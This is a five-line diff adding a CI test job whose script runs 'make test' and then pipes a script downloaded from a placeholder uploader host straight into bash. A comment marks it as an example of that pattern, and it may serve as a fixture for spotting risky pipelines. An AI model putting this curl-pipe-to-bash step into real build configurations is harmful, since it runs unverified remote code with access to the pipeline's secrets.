@@ -1,0 +1,5 @@
+# A downloaded uploader piped into a shell.
+test:
+  script:
+    - make test
+    - curl -s https://uploader.example.invalid/bash | bash
